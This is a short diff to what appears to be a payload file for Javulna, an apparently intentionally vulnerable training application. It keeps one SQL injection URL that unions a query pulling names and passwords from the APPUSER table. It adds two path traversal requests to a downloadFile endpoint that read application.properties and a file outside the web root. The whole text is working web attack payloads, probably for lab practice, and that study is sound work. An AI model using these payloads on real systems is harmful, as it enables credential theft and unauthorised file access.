@@ -1,1 +1,4 @@
 {{javulna_host}}/rest/movie?title=Empire&description=Luke%' union select all name, password, null, null from APPUSER --
+
+{{javulna_host}}/downloadFile?fileName=../../src/main/resources/application.properties
+{{javulna_host}}/downloadFile?fileName=../../../../cw.ods
